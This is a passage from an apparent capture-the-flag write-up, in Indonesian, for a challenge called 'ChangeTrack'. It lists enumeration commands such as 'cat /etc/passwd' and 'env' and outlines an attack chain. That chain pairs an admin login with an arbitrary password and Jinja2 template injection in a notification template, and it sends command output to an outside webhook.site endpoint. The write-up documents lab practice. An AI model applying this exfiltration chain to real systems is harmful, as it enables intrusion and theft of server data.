# ChangeTrack — Analisis

[← Overview](48-changetrack.md) · [Index](index.md)

## 2.5 Catatan saat enumerasi

- `cat /flag.txt` berhasil dan mengembalikan flag.
- `echo /app/*` menunjukkan layout: `/app/app.py`, `/app/templates`, `/app/utils`, `/tmp/changetrack_users.json`.
- `ls /`, `env`, `cat /etc/passwd` pada beberapa percobaan tidak menghasilkan webhook (kemungkinan output/command tertentu terfilter atau worker gagal). Kami tidak membutuhkannya karena `/flag.txt` sudah cukup.
- Target `https://httpbin.org/uuid` sempat berhenti memicu notifikasi (mungkin rate limit); `https://api.github.com/zen` (selalu berubah) dipakai untuk memastikan worker mendeteksi perubahan.
- Setiap klik “test” dapat mengirim dua request (worker + test), sehingga capture bisa duplikat. Itu normal.

## 2.6 Rantai penuh

```text
login sebagai admin@changetrack.local (password apa pun non-trivial)
  -> edit watcher-01
  -> notification.webhook_url = https://webhook.site/<token>
  -> notification.template = Jinja2 SSTI
  -> POST /watchers/watch-01/test
  -> worker render + POST ke webhook
  -> flag di body capture
```
